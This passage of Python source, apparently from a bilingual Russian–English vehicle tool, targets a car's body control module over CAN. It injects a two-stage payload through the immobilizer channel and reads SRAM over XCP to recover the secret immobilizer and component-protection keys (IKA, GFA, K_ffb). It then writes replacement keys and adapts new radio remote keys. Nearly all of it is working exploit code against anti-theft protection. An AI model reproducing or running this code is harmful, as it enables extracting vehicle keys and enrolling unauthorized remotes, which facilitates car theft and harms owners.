    buf_addr = int(profile["wfs_rx_buf"])
    desc_addr = int(profile["wfs_rx_desc"])
    job3_state_addr = int(profile["job3_state_addr"])
    template_size = (job3_state_addr - buf_addr) + 1

    pre_state = link.xcp_read_memory(job3_state_addr, 17, timeout=1.2)
    if len(pre_state) == 17 and pre_state[1:17] != bytes(16):
        if _hard_reset_and_wait_bcm(link, profile=profile):
            link.xcp_connect(profile=profile, timeout=1.2)

    ram_snapshot = link.xcp_read_memory(buf_addr, template_size, timeout=1.5)
    stage1, stage2 = bcm_build_job3_injection_stages(profile, ram_snapshot, target_addr=target_addr)

    for attempt in range(2):
        try:
            link.drain_rx(quick=True)
            link.send_isotp_channel(
                BCM_WFS_TX_ID,
                BCM_WFS_RX_ID,
                stage1,
                wait_desc_addr=desc_addr,
                expected_desc_val=buf_addr,
                st_min_floor=0.005,
                timeout=2.5,
            )
            break
        except TimeoutError:
            if attempt == 0:
                if not link.via_gateway:
                    link.send_komfort_wake_burst()
                if not _is_in_memory_bus(link):
                    time.sleep(0.25)
                link.drain_rx(quick=True)
                continue
            raise

    time.sleep(0.02 if _is_in_memory_bus(link) else 0.25)
    armed_state = link.xcp_read_memory(job3_state_addr, 17, timeout=1.2)
    if armed_state[0] != 3:
        raise RuntimeError(
            tr(
                f"Стадия 1 не взвела Crypto Job 3 @ 0x{job3_state_addr:08X} (состояние: {armed_state.hex()})",
                f"Stage 1 did not arm Crypto Job 3 @ 0x{job3_state_addr:08X} (state: {armed_state.hex()})",
            )
        )

    link.drain_rx(quick=True)
    link.send_isotp_channel(
        BCM_WFS_TX_ID,
        BCM_WFS_RX_ID,
        stage2,
        wait_desc_addr=desc_addr,
        expected_desc_val=buf_addr,
        st_min_floor=0.005,
        timeout=2.5,
    )
    pdu_trigger = trigger_80_01_pdu if trigger_80_01_pdu is not None else (b"\x80\x01" + bytes(16))
    wfs_resp_hex = ""
    with contextlib.suppress(Exception):
        wfs_resp = link.request_wfs(pdu_trigger, expected_first_byte=0xC0, timeout=3.5)
        wfs_resp_hex = wfs_resp.hex()

    final_state = b""
    poll_delays = (0.01,) if _is_in_memory_bus(link) else (0.05, 0.1, 0.2, 0.5, 1.0, 2.0)
    for delay in poll_delays:
        time.sleep(delay)
        final_state = link.xcp_read_memory(job3_state_addr, 17, timeout=1.2)
        if final_state[0] == 1 and final_state[1:17] != bytes(16):
            break
    if len(final_state) < 17 or final_state[0] != 1 or final_state[1:17] == bytes(16):
        raise RuntimeError(
            tr(
                f"Планировщик Crypto Job 3 не завершился (состояние @ 0x{job3_state_addr:08X}: {final_state.hex()})",
                f"Crypto Job 3 scheduler did not complete (state @ 0x{job3_state_addr:08X}: {final_state.hex()})",
            )
        )

    gfa_raw = link.xcp_read_memory(int(profile["gfa_aes_buf"]), 16, timeout=1.2)
    last_rk = link.xcp_read_memory(int(profile["last_round_key_addr"]), 16, timeout=1.2)
    gfa_working = bcm_gfa_raw_to_working(gfa_raw)
    recovered = bcm_recover_ika_from_job3(final_state[1:17], last_rk, gfa_working)
    return {
        "plaintext_bytes": bytes.fromhex(recovered["ika_hex"]),
        "plaintext_hex": recovered["ika_hex"],
        "gfa_working": gfa_working,
        "gfa_working_hex": gfa_working.hex(),
        "gfa_raw_hex": gfa_raw.hex(),
        "last_round_key_hex": last_rk.hex(),
        "job3_output_hex": recovered["job3_output_hex"],
        "encrypted_final_hex": recovered["final_block_hex"],
        "template_sha256": hashlib.sha256(ram_snapshot).hexdigest(),
        "wfs_trigger_response": wfs_resp_hex,
    }


def _read_bcm_keys_in_session(
    link: BcmCanLink,
    profile: dict[str, Any],
    *,
    pre_status: dict[str, Any] | None = None,
    preserve_ffb: bool = True,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, str]:
    """Run two-stage WFS Job 3 queue + XCP read to recover working `IKA`, `GFA`, and `K_ffb`, restoring SRAM & FFB keys."""
    ffb_backup = (
        _backup_bcm_ffb_for_read(link, profile=profile, pre_status=pre_status)
        if preserve_ffb
        else {"k_ffb": b"", "freq_code": 0x03, "populated_slots": []}
    )

    k_ffb_hex = ffb_backup["k_ffb"].hex() if len(ffb_backup.get("k_ffb") or b"") == 16 else ""
    ika_trigger_pdu: bytes | None = None

    # If the BCM has learned FFB remote keys and `NvM 0x02` (`K_ffb`) is blocked on UDS `23 12` / XCP,
    # run a first Job 3 pass targeting `ffb_nvm_key_addr` (`0x40005D24` on EA/0511, `0x40004356` on DD/0273).
    # Job 3 (priority 0x01) reads `K_ffb` before Job 5 (priority 0x0A) or `80 01` NvM writes touch `NvM 0x02`.
    if (
        preserve_ffb
        and ffb_backup.get("populated_slots")
        and len(ffb_backup.get("k_ffb") or b"") != 16
        and profile.get("ffb_nvm_key_addr")
    ):
        kffb_pass = _read_bcm_job3_target_in_session(
            link,
            profile,
            target_addr=int(profile["ffb_nvm_key_addr"]),
        )
        ffb_backup["k_ffb"] = kffb_pass["plaintext_bytes"]
        k_ffb_hex = kffb_pass["plaintext_hex"]
        ika_trigger_pdu = bcm_build_wfs_80_01(kffb_pass["gfa_working"], ffb_backup["k_ffb"])
        _hard_reset_and_wait_bcm(link, profile=profile)

    try:
        ika_pass = _read_bcm_job3_target_in_session(
            link,
            profile,
            target_addr=int(profile["ika_working_addr"]),
            trigger_80_01_pdu=ika_trigger_pdu,
        )
    except Exception:
        if preserve_ffb and len(ffb_backup.get("k_ffb") or b"") == 16:
            with contextlib.suppress(Exception):
                gfa_err_raw = link.xcp_read_memory(int(profile["gfa_aes_buf"]), 16, timeout=1.2)
                if gfa_err_raw not in (bytes(16), b"\xff" * 16):
                    _restore_bcm_ffb_after_read(link, bcm_gfa_raw_to_working(gfa_err_raw), ffb_backup, reporter=reporter)
        raise

    gfa_working = ika_pass["gfa_working"]

    # Restore clean working IKA in SRAM from NvM so repeated reads and subsequent 2E 00BE/00BD writes are deterministic.
    _hard_reset_and_wait_bcm(link, profile=profile)

    # Restore pre-existing K_ffb & learned FFB remote keys that `80 01` cleared in DFLASH.
    if preserve_ffb:
        try:
            _restore_bcm_ffb_after_read(link, gfa_working, ffb_backup, reporter=reporter)
        except Exception as exc:
            reporter.warning(
                tr(
                    f"Не удалось автоматически восстановить ключи FFB ({exc}); K_ffb={k_ffb_hex.upper()}",
                    f"Could not auto-restore FFB keys ({exc}); K_ffb={k_ffb_hex.upper()}",
                )
            )

    reporter.info(
        tr(
            f"BCM IKA: {ika_pass['plaintext_hex'].upper()} | GFA: {gfa_working.hex().upper()}"
            + (f" | K_ffb: {k_ffb_hex.upper()}" if k_ffb_hex else ""),
            f"BCM IKA: {ika_pass['plaintext_hex'].upper()} | GFA: {gfa_working.hex().upper()}"
            + (f" | K_ffb: {k_ffb_hex.upper()}" if k_ffb_hex else ""),
        )
    )
    return {
        "ika_hex": ika_pass["plaintext_hex"],
        "gfa_working_hex": ika_pass["gfa_working_hex"],
        "gfa_raw_hex": ika_pass["gfa_raw_hex"],
        "k_ffb_hex": k_ffb_hex,
        "last_round_key_hex": ika_pass["last_round_key_hex"],
        "job3_output_hex": ika_pass["job3_output_hex"],
        "encrypted_ika_final_hex": ika_pass["encrypted_final_hex"],
        "template_sha256": ika_pass["template_sha256"],
    }


def can_bcm_read_all(
    port: str,
    *,
    interface: str = "slcan",
    bus: Any | None = None,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    sw_profile: str | None = None,
    include_keys: bool = False,
    log_path: Path | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Single-session read of 09 BCM on connect: passport, KS/FFB status, NvM FFB slots, and ODIS DTCs (plus optional keyless IKA/GFA)."""
    can_xcp = bool(include_keys and ((not via_gateway) or gateway_bridge))
    total_steps = 4 if can_xcp else 3
    with _managed_bcm_session(
        port,
        interface=interface,
        log_path=log_path,
        bus=bus,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_raw_komfort=can_xcp,
        sw_profile=sw_profile,
        reporter=reporter,
    ) as (link, bridged):
        reporter.step(
            1,
            total_steps,
            tr("Чтение паспорта 09 BCM (UDS 0x70E / 0x778)", "Reading 09 BCM passport (UDS 0x70E / 0x778)"),
        )
        passport = _read_bcm_passport_in_session(link)
        if not passport:
            raise RuntimeError(
                tr(
                    "Блок 09 BCM (0x70E / 0x778) не ответил на запросы UDS.",
                    "09 BCM (0x70E / 0x778) did not respond to UDS requests.",
                )
            )
        profile = bcm_detect_profile(passport, sw_profile=sw_profile)

        reporter.step(
            2,
            total_steps,
            tr(
                "Чтение статуса защиты компонентов и слотов радиоключей FFB (DID 0x0A65 / 0x1983, NvM 0x05..0x19)",
                "Reading Component Protection status & FFB remote key slots (DID 0x0A65 / 0x1983, NvM 0x05..0x19)",
            ),
        )
        status = _read_bcm_status_in_session(link, include_nvm_slots=True, profile=profile)
        if (
            not can_xcp
            and via_gateway
            and gateway_bridge
            and not status.get("ffb_slots")
            and (status.get("ffb_learned_count") or 0) > 0
        ):
            with contextlib.suppress(Exception):
                from contitool.can.bridge import j533_can_bridge

                with j533_can_bridge(
                    port,
                    interface=interface,
                    target_channel=gateway_channel,
                    log_path=log_path,
                    bus=bus,
                    reporter=reporter,
                ) as br:
                    with BcmCanLink(
                        port,
                        interface=interface,
                        log_path=log_path,
                        bus=br.bus,
                        via_gateway=False,
                        sw_profile=sw_profile,
                    ) as br_link:
                        br_link.send_komfort_wake_burst()
                        xcp_slots = _read_ffb_slots_via_xcp(br_link, profile)
                        if xcp_slots:
                            status = _read_bcm_status_in_session(br_link, include_nvm_slots=True, profile=profile)

        reporter.step(
            3,
            total_steps,
            tr("Чтение и расшифровка ошибок DTC (UDS 19 02)", "Reading and decoding DTCs (UDS 19 02)"),
        )
        dtcs: list[dict[str, Any]] = []
        dtc_warning = ""
        try:
            dtcs = _read_bcm_dtcs_in_session(link)
        except Exception as exc:
            dtc_warning = str(exc)
            reporter.warning(tr(f"Чтение DTC не удалось: {exc}", f"DTC read failed: {exc}"))

        ika_hex = ""
        gfa_working_hex = ""
        k_ffb_hex = ""
        keys_warning = ""
        if can_xcp:
            reporter.step(
                4,
                total_steps,
                tr("Чтение ключей IKA + GFA (WFS Ch 3 + XCP)", "Reading IKA + GFA keys (WFS Ch 3 + XCP)"),
            )
            try:
                key_info = _read_bcm_keys_in_session(link, profile, pre_status=status, reporter=reporter)
                ika_hex = key_info["ika_hex"]
                gfa_working_hex = key_info["gfa_working_hex"]
                k_ffb_hex = key_info.get("k_ffb_hex", "")
            except Exception as exc:
                keys_warning = str(exc)
                reporter.warning(
                    tr(
                        f"Авто-чтение IKA/GFA через XCP пропущено: {exc}",
                        f"Auto IKA/GFA read via XCP skipped: {exc}",
                    )
                )
                with contextlib.suppress(Exception):
                    gfa_only = _read_bcm_gfa_in_session(link, profile, pre_status=status, reporter=reporter)
                    gfa_working_hex = gfa_only.get("gfa_working_hex", "")
                    k_ffb_hex = gfa_only.get("k_ffb_hex", "")

        return {
            "ecu_kind": "bcm",
            "operation": "read_all",
            "flash_writes": False,
            "via_gateway": bool(via_gateway),
            "gateway_bridged": bool(bridged),
            "profile": profile,
            "passport": passport,
            "status": status,
            "dtcs": dtcs,
            "ika_hex": ika_hex,
            "gfa_working_hex": gfa_working_hex,
            "k_ffb_hex": k_ffb_hex,
            "keys_warning": keys_warning,
            "dtc_warning": dtc_warning,
        }


def _read_bcm_gfa_in_session(
    link: BcmCanLink,
    profile: dict[str, Any],
    *,
    pre_status: dict[str, Any] | None = None,
    preserve_ffb: bool = True,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, str]:
    """Read BCM working `GFA` keyless via WFS Ch 3 + XCP `SHORT_UPLOAD`, preserving `K_ffb` and learned FFB keys."""
    ffb_backup = (
        _backup_bcm_ffb_for_read(link, profile=profile, pre_status=pre_status)
        if preserve_ffb
        else {"k_ffb": b"", "freq_code": 0x03, "populated_slots": []}
    )
    k_ffb_hex = ffb_backup["k_ffb"].hex() if len(ffb_backup.get("k_ffb") or b"") == 16 else ""

    if (
        preserve_ffb
        and ffb_backup.get("populated_slots")
        and len(ffb_backup.get("k_ffb") or b"") != 16
        and profile.get("ffb_nvm_key_addr")
    ):
        kffb_pass = _read_bcm_job3_target_in_session(
            link,
            profile,
            target_addr=int(profile["ffb_nvm_key_addr"]),
        )
        ffb_backup["k_ffb"] = kffb_pass["plaintext_bytes"]
        k_ffb_hex = kffb_pass["plaintext_hex"]
        gfa_working = kffb_pass["gfa_working"]
        _hard_reset_and_wait_bcm(link, profile=profile)
        try:
            _restore_bcm_ffb_after_read(link, gfa_working, ffb_backup, reporter=reporter)
        except Exception as exc:
            reporter.warning(
                tr(
                    f"Не удалось автоматически восстановить ключи FFB ({exc}); K_ffb={k_ffb_hex.upper()}",
                    f"Could not auto-restore FFB keys ({exc}); K_ffb={k_ffb_hex.upper()}",
                )
            )
        reporter.info(
            tr(
                f"BCM GFA считан (профиль {profile['id']}): {gfa_working.hex().upper()} | K_ffb: {k_ffb_hex.upper()}",
                f"BCM GFA read (profile {profile['id']}): {gfa_working.hex().upper()} | K_ffb: {k_ffb_hex.upper()}",
            )
        )
        return {
            "gfa_working_hex": kffb_pass["gfa_working_hex"],
            "gfa_raw_hex": kffb_pass["gfa_raw_hex"],
            "k_ffb_hex": k_ffb_hex,
            "last_round_key_hex": kffb_pass["last_round_key_hex"],
            "wfs_trigger_response": kffb_pass["wfs_trigger_response"],
        }

    _enter_bcm_diagnostic_session(link, 0x01, timeout=1.2)
    if not link.via_gateway:
        link.send_komfort_wake_burst()
    link.xcp_connect(profile=profile, timeout=1.2)
    try:
        wfs_resp = link.request_wfs(b"\x80\x01" + bytes(16), expected_first_byte=0xC0, timeout=3.5)
        wfs_resp_hex = wfs_resp.hex()
    except Exception as exc:
        wfs_resp_hex = repr(exc)
    time.sleep(0.01 if _is_in_memory_bus(link) else 0.05)

    gfa_raw = link.xcp_read_memory(int(profile["gfa_aes_buf"]), 16, timeout=1.2)
    last_rk = link.xcp_read_memory(int(profile["last_round_key_addr"]), 16, timeout=1.2)
    if gfa_raw in (bytes(16), b"\xff" * 16):
        raise RuntimeError(
            tr(
                f"Буфер GFA @ 0x{int(profile['gfa_aes_buf']):08X} пуст ({gfa_raw.hex()}). Проверьте профиль ПО ({profile['id']}).",
                f"GFA buffer @ 0x{int(profile['gfa_aes_buf']):08X} is empty ({gfa_raw.hex()}). Verify firmware profile ({profile['id']}).",
            )
        )
    gfa_working = bcm_gfa_raw_to_working(gfa_raw)
    if preserve_ffb:
        try:
            _restore_bcm_ffb_after_read(link, gfa_working, ffb_backup, reporter=reporter)
        except Exception as exc:
            reporter.warning(
                tr(
                    f"Не удалось автоматически восстановить ключи FFB ({exc}); K_ffb={k_ffb_hex.upper()}",
                    f"Could not auto-restore FFB keys ({exc}); K_ffb={k_ffb_hex.upper()}",
                )
            )
    reporter.info(
        tr(
            f"BCM GFA считан (профиль {profile['id']}): {gfa_working.hex().upper()}",
            f"BCM GFA read (profile {profile['id']}): {gfa_working.hex().upper()}",
        )
    )
    return {
        "gfa_working_hex": gfa_working.hex(),
        "gfa_raw_hex": gfa_raw.hex(),
        "k_ffb_hex": k_ffb_hex,
        "last_round_key_hex": last_rk.hex(),
        "wfs_trigger_response": wfs_resp_hex,
    }


def can_bcm_status(
    port: str,
    *,
    interface: str = "slcan",
    bus: Any | None = None,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    sw_profile: str | None = None,
    include_nvm_slots: bool = True,
    log_path: Path | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Read 09 BCM passport, Component Protection (`KS`) state, RF frequency (`0x0A65`), and learned FFB remote keys over UDS."""
    with _managed_bcm_session(
        port,
        interface=interface,
        log_path=log_path,
        bus=bus,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_raw_komfort=False,
        sw_profile=sw_profile,
        reporter=reporter,
    ) as (link, bridged):
        reporter.step(
            1,
            2,
            tr(
                "Чтение паспорта 09 BCM (UDS 0x70E / 0x778)",
                "Reading 09 BCM passport (UDS 0x70E / 0x778)",
            ),
        )
        passport = _read_bcm_passport_in_session(link)
        if not passport:
            raise RuntimeError(
                tr(
                    "Блок 09 BCM (0x70E / 0x778) не ответил на запросы UDS.",
                    "09 BCM (0x70E / 0x778) did not respond to UDS requests.",
                )
            )
        profile = bcm_detect_profile(passport, sw_profile=sw_profile)
        reporter.step(
            2,
            2,
            tr(
                "Чтение статуса защиты компонентов (KS) и радиоканала FFB",
                "Reading Component Protection (KS) and FFB remote key status",
            ),
        )
        status = _read_bcm_status_in_session(link, include_nvm_slots=include_nvm_slots, profile=profile)
        return {
            "ecu_kind": "bcm",
            "via_gateway": bool(via_gateway),
            "gateway_bridged": bool(bridged),
            "profile": profile,
            "passport": passport,
            "status": status,
        }


def can_bcm_read_gfa(
    port: str,
    *,
    interface: str = "slcan",
    bus: Any | None = None,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    sw_profile: str | None = None,
    log_path: Path | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Read BCM group key `GFA` keyless via WFS Ch 3 Job 5 trigger + XCP `SHORT_UPLOAD` (zero flash writes)."""
    with _managed_bcm_session(
        port,
        interface=interface,
        log_path=log_path,
        bus=bus,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_raw_komfort=True,
        sw_profile=sw_profile,
        reporter=reporter,
    ) as (link, bridged):
        reporter.step(
            1,
            2,
            tr(
                "Идентификация 09 BCM и подключение к агенту XCP",
                "Identifying 09 BCM and connecting to XCP agent",
            ),
        )
        passport = _read_bcm_passport_in_session(link)
        profile = bcm_detect_profile(passport, sw_profile=sw_profile)
        reporter.step(
            2,
            2,
            tr(
                "Чтение группового ключа GFA (WFS Job 5 + XCP SHORT_UPLOAD)",
                "Reading GFA group key (WFS Job 5 + XCP SHORT_UPLOAD)",
            ),
        )
        gfa_info = _read_bcm_gfa_in_session(link, profile, reporter=reporter)
        status = _read_bcm_status_in_session(link, include_nvm_slots=True, profile=profile)
        return {
            "ecu_kind": "bcm",
            "operation": "read_gfa",
            "flash_writes": False,
            "via_gateway": bool(via_gateway),
            "gateway_bridged": bool(bridged),
            "profile": profile,
            "passport": passport,
            "status": status,
            **gfa_info,
        }


def can_bcm_read_keys(
    port: str,
    *,
    interface: str = "slcan",
    bus: Any | None = None,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    sw_profile: str | None = None,
    output_dir: Path | None = None,
    log_path: Path | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Read both BCM `IKA` (individual key) and `GFA` (vehicle group key) via WFS Ch 3 queue + XCP (zero flash writes)."""
    with _managed_bcm_session(
        port,
        interface=interface,
        log_path=log_path,
        bus=bus,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_raw_komfort=True,
        sw_profile=sw_profile,
        reporter=reporter,
    ) as (link, bridged):
        reporter.step(
            1,
            2,
            tr(
                "Идентификация 09 BCM и подключение к агенту XCP",
                "Identifying 09 BCM and connecting to XCP agent",
            ),
        )
        passport = _read_bcm_passport_in_session(link)
        profile = bcm_detect_profile(passport, sw_profile=sw_profile)

        reporter.step(
            2,
            2,
            tr(
                "Чтение IKA + GFA (WFS Ch 3 + XCP) и восстановление ОЗУ",
                "Reading IKA + GFA (WFS Ch 3 + XCP) and restoring SRAM",
            ),
        )
        key_info = _read_bcm_keys_in_session(link, profile, reporter=reporter)
        status = _read_bcm_status_in_session(link, include_nvm_slots=True, profile=profile)

        result: dict[str, Any] = {
            "ecu_kind": "bcm",
            "operation": "read_keys",
            "flash_writes": False,
            "timestamp_utc": datetime.now(timezone.utc).isoformat(),
            "via_gateway": bool(via_gateway),
            "gateway_bridged": bool(bridged),
            "profile": profile,
            "passport": passport,
            "status": status,
            **key_info,
        }
        if output_dir is not None:
            output_dir.mkdir(parents=True, exist_ok=True)
            out_file = output_dir / "bcm_keys.json"
            out_file.write_text(json.dumps(result, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
            result["output_path"] = str(out_file)
        return result


def can_bcm_write_keys(
    port: str,
    *,
    current_ika: bytes | str,
    new_ika: bytes | str | None = None,
    new_gfa: bytes | str | None = None,
    restore_gfa: bytes | str | None = None,
    hard_reset: bool = True,
    interface: str = "slcan",
    bus: Any | None = None,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    sw_profile: str | None = None,
    log_path: Path | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Write personalized `IKA` (`2E 00BE`) and/or vehicle group key `GFA` (`2E 00BD`) to 09 BCM over standard UDS (`0x70E/0x778`).

    Important BCM firmware rule (`FUN_000BF998` / `FUN_000BFA5E`):
    - Writing `DID 0x00BE` (`new_ika`) automatically erases the stored `GFA` to `16 x 0xFF` and immediately switches
      the active key to `new_ika`.
    - Therefore, `new_ika` (`0x00BE`) is always written FIRST (encrypted under `current_ika`), and `new_gfa` (or
      `restore_gfa`) (`0x00BD`) is written SECOND (encrypted under the updated `active_ika`).
    """
    cur_ika_bytes = _norm_key_16b(current_ika, "current_ika")
    new_ika_bytes = _norm_key_16b(new_ika, "new_ika") if new_ika is not None and str(new_ika).strip() else None
    eff_gfa_input = new_gfa if (new_gfa is not None and str(new_gfa).strip()) else restore_gfa
    new_gfa_bytes = _norm_key_16b(eff_gfa_input, "new_gfa") if eff_gfa_input is not None and str(eff_gfa_input).strip() else None

    if new_ika_bytes is None and new_gfa_bytes is None:
        raise ValueError("At least one of new_ika or new_gfa must be specified for can_bcm_write_keys()")

    with _managed_bcm_session(
        port,
        interface=interface,
        log_path=log_path,
        bus=bus,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_raw_komfort=False,
        sw_profile=sw_profile,
        reporter=reporter,
    ) as (link, bridged):
        total_steps = (1 if new_ika_bytes is not None else 0) + (1 if new_gfa_bytes is not None else 0) + 1
        step_idx = 1
        reporter.step(
            step_idx,
            total_steps,
            tr(
                "Идентификация 09 BCM перед записью ключей CP (KS)",
                "Identifying 09 BCM before writing CP (KS) keys",
            ),
        )
        passport = _read_bcm_passport_in_session(link)
        active_ika = cur_ika_bytes
        ika_written = False
        gfa_written = False
        challenge_ika_hex = ""
        challenge_gfa_hex = ""

        if new_ika_bytes is not None:
            step_idx += 1
            reporter.step(
                step_idx,
                total_steps,
                tr(
                    "Запрос вызова 22 02F9 и запись индивидуального ключа IKA (2E 00BE)",
                    "Requesting 22 02F9 challenge and writing individual key IKA (2E 00BE)",
                ),
            )
            ch_resp = link.request_uds(b"\x22\x02\xf9", 0x62, timeout=3.0)
            challenge_ika_hex = ch_resp[3:].hex()
            container_ika = bcm_build_cp_key_container(active_ika, new_ika_bytes, BCM_CP_KEY_TYPE_IKA)
            resp_be = link.request_uds(b"\x2e\x00\xbe" + container_ika, 0x6E, timeout=6.0)
            if resp_be[:3] != b"\x6e\x00\xbe":
                raise RuntimeError(f"Unexpected 2E 00BE response: {resp_be.hex()}")
            ika_written = True
            active_ika = new_ika_bytes
            reporter.info(
                tr(
                    f"Новый IKA успешно принят блоком 09 BCM (6E 00BE): {new_ika_bytes.hex().upper()}",
                    f"New IKA accepted by 09 BCM (6E 00BE): {new_ika_bytes.hex().upper()}",
                )
            )

        if new_gfa_bytes is not None:
            step_idx += 1
            reporter.step(
                step_idx,
                total_steps,
                tr(
                    "Запрос вызова 22 02F9 и запись группового ключа GFA (2E 00BD)",
                    "Requesting 22 02F9 challenge and writing vehicle group key GFA (2E 00BD)",
                ),
            )
            ch_resp = link.request_uds(b"\x22\x02\xf9", 0x62, timeout=3.0)
            challenge_gfa_hex = ch_resp[3:].hex()
            container_gfa = bcm_build_cp_key_container(active_ika, new_gfa_bytes, BCM_CP_KEY_TYPE_GFA)
            resp_bd = link.request_uds(b"\x2e\x00\xbd" + container_gfa, 0x6E, timeout=6.0)
            if resp_bd[:3] != b"\x6e\x00\xbd":
                raise RuntimeError(f"Unexpected 2E 00BD response: {resp_bd.hex()}")
            gfa_written = True
            reporter.info(
                tr(
                    f"Групповой ключ GFA успешно принят блоком 09 BCM (6E 00BD): {new_gfa_bytes.hex().upper()}",
                    f"Group key GFA accepted by 09 BCM (6E 00BD): {new_gfa_bytes.hex().upper()}",
                )
            )

        reset_ok = False
        if hard_reset:
            reset_ok = _hard_reset_and_wait_bcm(link)

        status_after = _read_bcm_status_in_session(link, include_nvm_slots=False)
        return {
            "ecu_kind": "bcm",
            "operation": "write_keys",
            "via_gateway": bool(via_gateway),
            "gateway_bridged": bool(bridged),
            "passport": passport,
            "ika_written": ika_written,
            "gfa_written": gfa_written,
            "active_ika_hex": active_ika.hex(),
            "new_gfa_hex": new_gfa_bytes.hex() if new_gfa_bytes else "",
            "challenge_ika_hex": challenge_ika_hex,
            "challenge_gfa_hex": challenge_gfa_hex,
            "hard_reset_sent": reset_ok,
            "status_after": status_after,
        }


def can_bcm_adapt_ffb(
    port: str,
    *,
    gfa: bytes | str | None = None,
    kc: bytes | str | None = None,
    k_ffb: bytes | str | None = None,
    entries: list[tuple[int, bytes | str]] | None = None,
    keys: list[dict[str, Any]] | None = None,
    freq_code: int | None = None,
    clear_all: bool = False,
    verify_after: bool = True,
    interface: str = "slcan",
    bus: Any | None = None,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    sw_profile: str | None = None,
    log_path: Path | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Adapt FFB remote keys in 09 BCM via stock WFS Channel 3 protocol (`0x17F8140E -> 0x17FA0E14`, `80 01` + `80 02`)."""
    with _managed_bcm_session(
        port,
        interface=interface,
        log_path=log_path,
        bus=bus,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_raw_komfort=True,
        sw_profile=sw_profile,
        reporter=reporter,
    ) as (link, bridged):
        reporter.step(
            1,
            4,
            tr(
                "Чтение конфигурации радиоканала 09 BCM (DID 0x0A65 / 0x1983)",
                "Reading 09 BCM RF configuration (DID 0x0A65 / 0x1983)",
            ),
        )
        passport = _read_bcm_passport_in_session(link)
        profile = bcm_detect_profile(passport, sw_profile=sw_profile)
        status_before = _read_bcm_status_in_session(link, include_nvm_slots=False)
        eff_freq = int(status_before.get("freq_code", 0x03) if freq_code is None else freq_code) & 0xFF

        if gfa is not None and str(gfa).strip():
            gfa_bytes = _norm_key_16b(gfa, "gfa")
            gfa_source = "provided"
        else:
            reporter.info(
                tr(
                    "Ключ GFA не задан — автоматически считываем GFA из 09 BCM по XCP...",
                    "GFA key not provided — reading GFA from 09 BCM via XCP automatically...",
                )
            )
            gfa_info = _read_bcm_gfa_in_session(link, profile, preserve_ffb=False, reporter=reporter)
            gfa_bytes = bytes.fromhex(gfa_info["gfa_working_hex"])
            gfa_source = "bcm_xcp"

        if k_ffb is not None and str(k_ffb).strip():
            k_ffb_bytes = _norm_key_16b(k_ffb, "k_ffb")
        elif kc is not None and str(kc).strip():
            kc_bytes = _norm_key_16b(kc, "kc")
            k_ffb_bytes = bcm_derive_k_ffb(kc_bytes)
        else:
            raise ValueError("Either kc (Immobilizer master key K_c) or k_ffb must be provided for FFB adaptation")

        norm_entries: list[tuple[int, bytes]] = []
        parsed_key_specs: list[tuple[int | bytes, int]] = []
        if clear_all:
            norm_entries = []
        elif entries is not None:
            for idx, (slot_num, c_val) in enumerate(entries, start=1):
                c_bytes = _norm_key_16b(c_val, f"FFB entry #{idx}")
                norm_entries.append((int(slot_num), c_bytes))
        elif keys is not None:
            # If the live BCM just reported its DID 0x0A65 frequency in Step 1, prefer the BCM's actual DID 0x0A65
            # frequency code because BCM firmware (`0x000C7998` on EA/0511) rejects any 80 02 record whose P[8]
            # differs from `(DID_0A65[0] >> 1) & 3` with `7F 80 02 22`.
            if status_before.get("rf_0a65_hex") and "freq_code" in status_before:
                live_bcm_freq = int(status_before["freq_code"]) & 0x03
                if eff_freq != live_bcm_freq:
                    reporter.info(
                        tr(
                            f"Частота ключа синхронизирована с DID 0x0A65 блока 09 BCM: 0x{live_bcm_freq:02X} ({BCM_FREQUENCIES.get(live_bcm_freq, hex(live_bcm_freq))})",
                            f"Key frequency synchronized with 09 BCM DID 0x0A65: 0x{live_bcm_freq:02X} ({BCM_FREQUENCIES.get(live_bcm_freq, hex(live_bcm_freq))})",
                        )
                    )
                    eff_freq = live_bcm_freq
            for idx, k_item in enumerate(keys, start=1):
                ser_val = k_item.get("serial_id")
                if isinstance(ser_val, str):
                    ser_clean = "".join(ser_val.split()).replace("0x", "").replace("0X", "")
                    if len(ser_clean) != 8:
                        raise ValueError(f"FFB key #{idx} serial_id must be 8 hex digits, got {ser_val!r}")
                    # Display IDs (e.g. from EEL 0x67) are 32-bit uints; raw_le_hex can also be passed via serial_le_hex
                    ser_arg: int | bytes = int(ser_clean, 16)
                elif "serial_le_hex" in k_item:
                    ser_arg = bytes.fromhex(str(k_item["serial_le_hex"]))
                elif isinstance(ser_val, (int, bytes, bytearray)):
                    ser_arg = ser_val
                else:
                    raise ValueError(f"FFB key #{idx} missing serial_id")
                cnt_val = int(k_item.get("rolling_counter", 0))
                parsed_key_specs.append((ser_arg, cnt_val))
                cipher = bcm_encrypt_ffb_key_record(
                    k_ffb_bytes,
                    ser_arg,
                    rolling_counter=cnt_val,
                    freq_code=eff_freq,
                )
